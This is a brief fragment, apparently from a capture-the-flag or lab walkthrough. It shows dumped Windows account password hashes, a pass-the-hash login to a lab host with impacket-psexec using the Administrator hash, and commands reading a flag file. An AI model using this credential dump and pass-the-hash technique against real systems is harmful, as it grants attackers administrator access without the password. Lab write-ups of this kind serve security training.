-> Administrator:500:aad3b435b51404eeaad3b435b51404ee:e53d4d912d96874e83429886c7bf22a1:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9e73cc8353847cfce7b5f88061103b43:::
sshd:1000:aad3b435b51404eeaad3b435b51404ee:6ba6aae01bae3868d8bf31421d586153:::
david:1009:aad3b435b51404eeaad3b435b51404ee:b20d19ca5d5504a0c9ff7666fbe3ada5:::
johanna:1010:aad3b435b51404eeaad3b435b51404ee:0b8df7c13384227c017efc6db3913374:::

impacket-psexec administrator@10.129.202.222 -hashes :e53d4d912d96874e83429886c7bf22a1

cd C:\Users\Administrator\Desktop
dir
more flag.txt.txt
```